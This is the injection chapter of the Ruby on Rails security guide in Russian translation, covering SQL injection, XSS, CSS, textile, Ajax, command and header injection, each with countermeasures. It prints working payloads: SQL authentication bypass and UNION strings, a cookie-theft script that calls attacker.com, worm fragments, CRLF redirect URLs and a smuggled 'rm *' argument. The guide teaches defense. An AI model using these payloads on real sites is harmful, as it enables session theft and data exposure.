# Инъекции

INFO: _Инъекции это класс атак, внедряющий злонамеренный код или параметры в веб приложение для запуска их вне контекста безопасности. Известными примерами инъекций являются межсайтовый скриптинг (XSS) и SQL инъекции._

Инъекции очень запутанные, поскольку тот же код или параметр может быть злонамеренным в одном контексте, но абсолютно безвредным в другом. Контекстом может быть сценарий, запрос или язык программирования, оболочка или метод Ruby/Rails. Следующие разделы раскроют все важные контексты, где могут произойти атаки в форме инъекций. Первый раздел, однако, раскроет архитектурное решение в связи с инъекцией.

### Белые списки против черных списков

NOTE: _При экранировании, защите или верификации чего-либо, белые списки приоритетнее черных списков._

Черный список может быть перечнем плохих адресов e-mail, непубличных действий или плохих тегов HTML. Этому противопоставляется белый список хороших адресов e-mail, публичных действий, хороших тегов HTML и так далее. Хотя иногда не возможно создать белый список (в фильтре спама, например), _предпочтительнее использовать подходы белого списка_:

* Используйте before_filter :only => [...] вместо :except => [...]. Тогда вы не забудете отключить только что добавленные экшны.
* Используйте attr_accessible вместо attr_protected. Подробнее смотрите "раздел по массовому назначению":/ruby-on-rails-security-guide/mass-assignment
* Разрешите &lt;strong&gt; вместо удаления &lt;script&gt; против кроссайтового скриптинга (XSS). Подробнее об этом ниже.
* Не пытайтесь править пользовательские данные с помощью черных списков:
    * Это позволит сработать атаке: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
    * Но отвергнет неправильный ввод

Белые списки также хороший подход против человеческого фактора в забывании чего-либо в черном списке.

### SQL инъекции

INFO: _Благодаря умным методам, это вряд ли является проблемой в большинстве приложений на Rails. Однако, это очень разрушительная и обычная атака на веб приложения, поэтому важно понять проблему._

#### Введение

Цель атаки в форме SQL инъекции - сделать запросы к базе данных, манипулируя с параметрами приложения. Популярная цель атак в форме SQL инъекций - обойти авторизацию. Другой целью является осуществление манипуляции с данными или чтение определенных данных. Вот пример, как не следует использовать пользовательские данные в запросе:

```ruby
Project.where("name = '#{params[:name]}'")
```

Это может быть экшн поиска и пользователь может ввести имя проекта, который он хочет найти. Если злонамеренный пользователь введет ' OR 1 --, результирующим SQL запросом будет:

```sql
SELECT * FROM projects WHERE name = '' OR 1 --'
```

Два тире начинают комментарий, игнорирующий все после него. Таким образом, запрос вернет все записи из таблицы projects, включая те, которые недоступны пользователю. Так случилось, поскольку условие истинно для всех записей.

#### Обход авторизации

Обычно веб приложения включают контроль доступа. Пользователь вводит свои полномочия входа, веб приложение пытается найти соответствующую запись в таблице пользователей. Приложение предоставляет доступ, когда находит запись. Однако, злоумышленник возможно сможет обойти эту проверку с помощью SQL инъекции. Следующее показывает типичный запрос к базе данных в Rails для поиска первой записи в таблице users, которая соответствует параметрам полномочий входа, предоставленных пользователем.

```ruby
User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

Если злоумышленник введет ' OR '1'='1 как имя и ' OR '2'>'1 как пароль, результирующий запрос SQL будет:

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

Это просто найдет первую запись в базе данных и предоставит доступ этому пользователю.

#### Неавторизованное чтение

Выражение UNION соединяет два запроса SQL и возвращает данные одним набором. Злоумышленник может использовать это, чтобы прочитать произвольную информацию из базы данных. Давайте рассмотрим вышеописанный пример:

```ruby
Project.where("name = '#{params[:name]}'")
```

Теперь позволим внедрить другой запрос, использующий выражение UNION:

```
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

Это приведет к следующему запросу SQL:

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

Результатом будет не список проектов (поскольку нет проектов с пустым именем), а список имен пользователя и их пароли. Поэтому надеемся, что вы шифруете пароли в базе данных! Единственной проблемой для злоумышленника может быть то, что число столбцов должно быть равное в обоих запросах. Вот почему второй запрос включает список единичек (1), который всегда будет иметь значение 1, чтобы количество столбцов соответствовало первому запросу.

Также второй запрос переименовывает некоторые столбцы выражением AS, чтобы веб приложение отображало значения из таблицы user. Убедитесь, что обновили свой Rails [как минимум до 2.1.1](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/).

#### Контрмеры

В Ruby on Rails есть встроенный фильтр для специальных символов SQL, которые экранируются ' , " , символ NULL и разрыв строки. _Использование `Model.find(id)` или `Model.find_by_some thing(something)` автоматически применяет эту контрмеру_. Но в фрагментах SQL, особенно _в фрагментах условий (`where("...")`), методах `connection.execute()` или `Model.find_by_sql()`, это должно быть применено вручную_.

Вместо передачи строки в опцию conditions, можете передать массив, чтобы экранировать испорченные строки, подобно этому:

```ruby
Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
```

Как видите, первая часть массива это фрагмент SQL с знаками вопроса. Экранируемые версии переменных во второй части массива заменяют знаки вопроса. Или можете передать хэш с тем же результатом:

```ruby
Model.where(:login => entered_user_name, :password => entered_password).first
```

Форма массива или хэша доступна только в экземплярах модели. В других местах используйте `sanitize_sql()`. _Введите в привычку думать о последствиях безопасности, когда используете внешние строки в SQL_.

### Межсайтовый скриптинг (XSS)

INFO: _Наиболее распространенная и одна из наиболее разрушительных уязвимостей в веб приложениях это XSS. Данная вредоносная атака внедряет на стороне клиента исполняемый код. Rails предоставляет методы для защиты от этих атак._

#### Точки входа

Точка входа это уязвимый URL и его параметры, с которых злоумышленник может начать атаку.

Наиболее распространенными точками входа являются публикации сообщений, комментарии пользователей и гостевые книги, но заголовки проектов, имена документов и страницы результата поиска также бывают уязвимы - почти везде, где пользователь может ввести данные. Но ввод не обязательно может придти из полей ввода на веб сайтах, это может быть любой параметр URL – очевидный, скрытый или внутренний. Помните, что пользователь может перехватить любой трафик. Приложения, такие как [плагин Live HTTP Headers Firefox](http://livehttpheaders.mozdev.org/), или клиентские прокси могут легко изменить запросы.

Атаки XSS работают подобным образом: злоумышленник встраивает некоторый код, веб приложение сохраняет его и отображает на странице, после чего представляет его жертве. Большинство примеров XSS просто отображают сообщение, но реальные возможности гораздо мощнее. XSS может своровать куки, похитить сессию, перенаправить жертву на фальшивый вебсайт, отобразить рекламу, полезную злоумышленнику, изменить элементы на веб странице, чтобы получить конфиденциальную информацию или установить вредоносное программное обеспечение, используя дыры в веб браузере.

Во второй половине 2007 года выявлено 88 уязвимостей в браузерах Mozilla, 22 в Safari, 18 в IE и 12 в Opera. [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) также задокументировал 239 уязвимостей плагинов для браузеров в последние шесть месяцев 2007 года. [Mpack](http://pandalabs.pandasecurity.com/archive/MPack-uncovered_2100_.aspx) очень активный и регулярно обновляемый фреймворк злоумышленников, который использует эти уязвимости. Для преступных хакеров очень привлекательно использовать уязвимость к SQL-инъекциям в фреймворке веб приложения и вставлять вредоносный код в каждый текстовый столбец таблицы. В апреле 2008 года более 510,000 сайтов были взломаны подобным образом, в том числе Британского правительства, ООН и многих других высокопоставленных организаций.

Относительно новыми и необычными точками входа является баннерная реклама. В начале 2008 года злонамеренный код появился в рекламных баннерах на популярных сайтах, таких как MySpace и Excite, сообщает [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/).

#### HTML/JavaScript инъекции

Наиболее распространенным языком для XSS является, конечно, наиболее популярный клиентский скриптовый язык JavaScript, часто в сочетании с HTML. _Экранирование пользовательского ввода необходима_.

Вот самый простой тест для проверки на XSS:

```html
<script>alert('Hello');</script>
```

Этот код JavaScript просто отображает сообщение. Следующие примеры делают примерно то же самое,но в очень необычных местах:

```html
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
```

##### Похищение куки

Пока эти примеры не делали никакого вреда, поэтому давайте посмотрим, как злоумышленник может похитить куки пользователя (и, таким образом, похитить пользовательскую сессию). В JavaScript можно использовать свойство document.cookie для чтения и записи куки документа. JavaScript обеспечивает политику ограничения домена, которая означает, что скрипт с одного домена не может получить доступ к куки другого домена. Свойство document.cookie содержит куки создавшего веб сервера. Однако это свойство можно прочитать и записать, если внедрите код непосредственно в документ HTML (как это происходит в XSS). Введите это где-нибудь в своем веб приложении, чтобы увидеть собственные куки на результирующей странице:

```
<script>document.write(document.cookie);</script>
```

Для злоумышленника, разумеется, бесполезно, что жертва видит свои куки. Следующий пример пытается загрузить изображение с URL http://www.attacker.com/ плюс куки. Конечно, этот URL не существует, поэтому браузер ничего не отобразит. Но злоумышленник сможет просмотреть логи доступа к своему веб серверу, чтобы увидеть куки жертв.

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

Лог файлы  на www.attacker.com будут подобны следующему:

```
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

Можно смягчить эти атаки (очевидным способом) добавив к куки флаг [httpOnly](http://dev.rubyonrails.org/ticket/8895), таким образом, document.cookie не сможет быть прочитан JavaScript. Http only куки могут использоваться начиная с IE v6.SP1, Firefox v2.0.0.5 и Opera 9.5. Safari все еще рассматривает, но игнорирует эту опцию. Но другие, более старые браузеры (такие как WebTV и IE 5.5 on Mac) могут фактически отказаться загружать страницу. Однако, будьте осторожны, что куки [все еще видны при использовании Ajax](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/).

##### Искажение

Исказив веб страницу, злоумышленник сможет сделать многое, например, предоставить ложную информацию или завлечь жертву на сайт злоумышленника, чтобы украсть куки, регистрационные данные или другую деликатную информацию. Наиболее популярным способом является включение кода с внешних источников с помощью iframe:

```html
<iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”></iframe>
```

Это загрузит произвольный HTML и/или JavaScript с внешнего источника и внедрит его, как часть сайта. Этот iframe взят из настоящей атаки на правительственные итальянские сайты с использованием [Mpack attack framework](http://isc.sans.org/diary.html?storyid=3015). Mpack пытается установить злонамеренное программное обеспечение через дыры безопасности в веб браузере – очень успешно, 50% атак успешны.

Более специализированные атаки могут накрывать целые веб сайты или отображать форму входа, которая выглядит как такая же на оригинальном сайте, но передает имя пользователя и пароль на сайт злоумышленников. Или могут использовать CSS и/или JavaScript, чтобы спрятать настоящую ссылку в веб приложении, и отобразить на ее месте другую, которая перенаправит на фальшивый веб сайт.

Атаки в форме искажающих инъекций являются такими, что основная загрузка не хранится, а предоставляется жертве позже, но включена в URL. Особенно в формах поиска не получается экранировать строку поиска. Следующая ссылка представляет страницу, озаглавленную "George Bush appointed a 9 year old boy to be the chairperson...":

```
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### Контрмеры

_Очень важно отфильтровывать злонамеренный ввод, но также важно экранировать вывод в веб приложении_.

Особенно для XSS, важно делать _фильтрацию ввода с помощью белого списка, а не черного_. Фильтрация белым списком устанавливает допустимые значения, остальные значения недопустимы. Черные списки всегда не законченные.

Предположим, черный список удаляет “script” из пользовательского ввода. Теперь злоумышленник встраивает “&lt;scrscriptipt&gt;”, и после фильтра остается “&lt;script&gt;”. Ранние версии Rails использовали подход черного списка для методов strip_tags(), strip_links() and sanitize(). Поэтому такой сорт инъекций был возможен:

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

Это возвратит "some&lt;script&gt;alert('hello')&lt;/script&gt;", что позволит осуществится атаке. Вот почему мы выбираем подход белого списка, используя метод Rails 2 sanitize():

```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, :tags => tags, :attributes => %w(href title))
```

Это допустит только заданные теги и сделает все хорошо, даже против всех ухищрений и злонамеренных тегов.

В качестве второго шага, _хорошо экранировать весь вывод в приложении_, особенно при переотображении пользовательского ввода, который не был отфильтрован при вводе (как в примере выше). _Используйте метод `escapeHTML()` (или его псевдоним `h()`)_, чтобы заменить введенные символы HTML &amp;, &quot;, &lt;, &gt; их неинтерпретируемыми представителями в HTML (`&amp;`, `&quot;`, `&lt`;, and `&gt;`). Однако, может случиться так, что программист забудет это сделать, поэтому _рекомендуется использовать плагин [SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/)_. SafeErb напоминает экранировать строки из внешних источников.

##### Обфусцированная и закодированная инъекция

Сетевой трафик главным образом основан на ограниченном Западном алфавите, поэтому новые кодировки символов, такие как Unicode, возникли для передачи символов на других языках. Но это также угроза для веб приложений, так как злонамеренный код может быть спрятан в различных кодировках, так что веб браузер сможет его выполнить, а веб приложение нет. Вот направление атаки в кодировке UTF-8:

```html
<IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;
  &amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;>
```

Этот пример вызывает окно сообщения. Хотя это распознается фильтром sanitize(). Хорошим инструментом для обфускации и кодирования строк (знайте своего врага!) является [Hackvertor](https://hackvertor.co.uk/public). Метод Rails sanitize() работает хорошо, отражая закодированные атаки.

#### Примеры из прошлого

_Чтобы понять сегодняшние атаки на веб приложения, лучше взглянуть на некоторые реальные направления атаки._

Нижеследующее это переведенная выдержка из [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! почтовый [червь](http://groovin.net/stuff/yammer.txt). Он появился 11 июня 2006 года и был первым червем для почтового интерфейса:

```html
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

Черви использовали дыру в фильтре HTML/JavaScript Yahoo, который обычно фильтровал все атрибуты target и onload из тегов (потому что там мог быть JavaScript). Однако фильтр применялся только раз, поэтому атрибут onload с кодом червя оставался. Это хороший пример, почему фильтры черного списка никогда не полные, и почему трудно позволить HTML/JavaScript в веб приложении.

Другой прототипный веб-почтовый червь Nduja, кроссдоменный червь для четырех итальянских веб-почтовых сервисов. Более детально описано в [статье Rosario Valotta](http://www.xssed.com/article/9/Paper_A_PoC_of_a_cross_webmail_worm_XWW_called_Njuda_connection/). Оба почтовых червя имели целью собрать почтовые адреса, на чем преступный хакер мог сделать деньги.

В декабре 2006 года 34,000 имени фактических пользователей и их пароли были похищены во время [фишинговой атаки на MySpace](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). Идеей атаки было создание профиля, названного “login_home_index_html”, поэтому URL выглядел очень правдоподобно. Специально созданный HTML и CSS использовался, чтобы скрыть настоящий контент MySpace и вместо этого отразить собственную форму входа.

Червь MySpace Samy будет обсужден в разделе CSS инъекций.

### CSS инъекция

INFO: _CSS инъекция - это фактически JavaScript инъекция, поскольку некоторые браузеры (IE, некоторые версии Safari и другие) разрешают JavaScript в CSS. Подумайте дважды о допустимости пользовательского CSS в вашем веб приложении._

CSS инъекция лучше всего объясняется известным червем, [MySpace Samy worm](http://namb.la/popular/tech.html). Этот червь автоматически рассылал предложение дружбы с Samy (злоумышленником), просто посетив его профиль. В течение нескольких часов он сделал свыше 1 миллиона запросов дружбы, но создал слишком много трафика на MySpace и сайт ушел в оффлайн. Ниже следует техническое объяснение червя.

MySpace блокирует много тегов, однако он позволял CSS. Поэтому автор червя поместил JavaScript в CSS следующим образом:

```html
<div style="background:url('javascript:alert(1)')">
```

Таким образом загрузка происходила через атрибут стиля. Но в загрузке не допустимы кавычки, так как одинарные и двойные кавычки уже были использованы. Но в JavaScript имеется удобная функция eval(), которая выполняет любую строку как код.

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

Функция eval() это кошмар для фильтров ввода на основе черного списка, так как она позволяет атрибуту стиля спрятать слово “innerHTML”:

```
alert(eval('document.body.inne' ` 'rHTML'));
```

Следующей проблемой было то, что MySpace фильтровал слово “javascript”, поэтому автор использовал “java&lt;NEWLINE&gt;script&quot; чтобы обойти это:

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
```

Следующей проблемой для автора червя были токены безопасности CSRF. Без них он не смог бы послать запросы дружбы через POST. Он обошел это, посылая GET на страницу перед добавлением пользователя и парся результат на токен CSRF.

В итоге он получил 4 KB червя, которого внедрил в свою страницу профиля.

Свойство [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS предоставляет другой способ внедрить JavaScript в CSS в основанных на Gecko браузерах (Firefox, к примеру).

#### Контрмеры

Этот пример снова показывает, что фильтр на основе черного списка никогда не полон. Однако, так как пользовательский CSS в веб приложениях достаточно редкая особенность, фильтры CSS на основе белого списка автору не известны. _Если хотите разрешить пользовательские цвета или картинки, разрешите выбрать их и создайте CSS в веб приложении_. Используйте метод Rails `sanitize()` как модель для фильтра CSS на основе белого списка, если это действительно нужно.

### Инъекция textile

Если хотите предоставить форматирование текста иное, чем HTML (для безопасности), используйте разметочный язык, конвертируемый в HTML на сервере. [RedCloth](http://redcloth.org/) это такой язык для Ruby, но без мер предосторожности он также уязвим к XSS.

Например, RedCloth переводит `_test_` в &lt;em&gt;test&lt;em&gt;, который делает текст курсивом. Однако, до версии 3.0.4 была уязвимость к XSS. Возьмите [новую версию 4](http://www.redcloth.org), в которой устранены серьезные баги. Однако даже эта версия имела (на момент написания статьи) [несколько багов безопасности](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), поэтому контрмеры только принимались. Вот пример для версии 3.0.4:

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

Используем опцию :filter_html, чтобы устранить HTML, который не был создан процессором Textile.

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

Однако, это не отфильтрует весь HTML, некоторые теги останутся (преднамеренно), например &lt;a&gt;:

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### Контрмеры

Рекомендуется _использовать RedCloth в сочетании с фильтром ввода на основе белого списка_, как описано в разделе о контрмерах против XSS.

### Ajax инъекции

NOTE: _Те же меры безопасности должны быть приняты для экшнов Ajax, что и для “нормальных”. Однако, есть как минимум одно исключение: Вывод экранируется уже в контроллере, если экшн не рендерит вьюху._

Если используете [плагин in_place_editor](http://dev.rubyonrails.org/browser/plugins/in_place_editing) или экшны, возвращающие строку, а не рендерите вьюху, _нужно экранировать возвращаемое значение в экшне_. В ином случае, если возвращаемое значение содержит строку с XSS, злонамеренный код выполнится по возващению в браузер. Экранируйте каждое введенное значение с помощью метода h().

### Инъекции командной строки

NOTE: _Используйте предоставленные пользователем параметры командной строки с предосторожностью_

Если ваше приложение запускает команды в лежащей в основе операционной системе, имеется несколько методов в Ruby: exec(command), syscall(command), system(command) и `command`. Вы должны быть особенно осторожны с этими функциями, если пользователь может вводить целые команды или часть их. Это так, так как во многих оболочках можно запускать другую команду в конце первой, разделяя их точкой с запятой (;) или вертикальной чертой (|).

Контрмерой является _использование метода `system(command, parameters)`, который передает параметры командной строки безопасно_.

```ruby
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
```

### Инъекция заголовка

WARNING: _Заголовки HTTP динамически создаются и при определенных обстоятельствах могут быть изменены пользовательски вводом. Это может привести к ложному перенаправлению, XSS или HTTP response splitting._

Заголовки запроса HTTP имеют поля Referer, User-Agent (клиентское ПО) и Cookie, среди прочих. Заголовки отклика, к примеру, имеют код статуса, Cookie и Location (цель перенаправления на URL). Все они предоставлены пользователем и могут быть манипулированы с большими или меньшими усилиями. _Не забывайте экранировать эти поля заголовка тоже._ Например, когды Вы отображаете user agent в администраторской зоне.

Кроме того, _важно знать, что делаете, когда создаете заголовки отклика, частично основанные на пользовательском вводе._ Например, вы хотите перенаправить пользователя на определенную страницу. Для этого вы представили поле “referer“ в форме для перенаправления на заданный адрес:

```ruby
redirect_to params[:referer]
```

Что произойдет, если Rails поместит строку в заголовок Location и пошлет статус 302 (redirect) браузеру. Первое, что сделает злонамеренный пользователь, это:

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
```

И благодаря багу в (Ruby and) Rails до версии 2.1.2 (исключая ее), хакер может внедрить произвольные поля заголовка; например, так:

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:`Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:`http://www.malicious.tld
```

Отметьте, что "%0d%0a" это URL-код для "\r\n", являющиеся возвратом каретки и новой строкой (CRLF) в Ruby. Таким образом, итоговым заголовком  HTTP для второго примера будет следующее, поскольку второе поле заголовка Location перезаписывает первое.

```
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
```

Таким образом, _направления атаки для инъекции заголовка основаны на инъекции символов CRLF в поле заголовка._ И что сможет сделать злоумышленник с ложным перенаправлением? Он сможет перенаправить на фишинговый сайт, который выглядит так же, как ваш, но просит заново авторизоваться (и посылает регистрационные данные злоумышленнику). Или он сможет установить злонамеренное ПО, используя дыры в безопасности браузера на этом сайте. Rails 2.1.2 экранирует эти символы для поля Location в методе `redirect_to`. _Убедитесь, что вы делаете то же самое, когда создаете другие поля заголовка на основе пользовательского ввода._

#### Response Splitting

Если инъекция заголовка была возможна, то Response Splitting так же может быть возможен. В HTTP блок заголовка заканчивается двумя CRLF, затем идут фактические данные (обычно HTML). Идея Response Splitting состоит во внедрении двух CRLF в поле заголовка, после которых следует другой отклик со злонамеренным HTML. Отклик будет таким:

```
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
```

При определенных обстоятельствах это сможет предоставить зловредный HTML жертве. Однако, это будет работать только с соединениями Keep-Alive  (а многие браузеры используют одноразовые соединения). Но нельзя на это полагаться. _В любом случае, это серьезный баг, и следует обновить Rails до версии 2.0.5 или 2.1.2, чтобы устранить риски инъекции заголовка (и поэтому response splitting)._
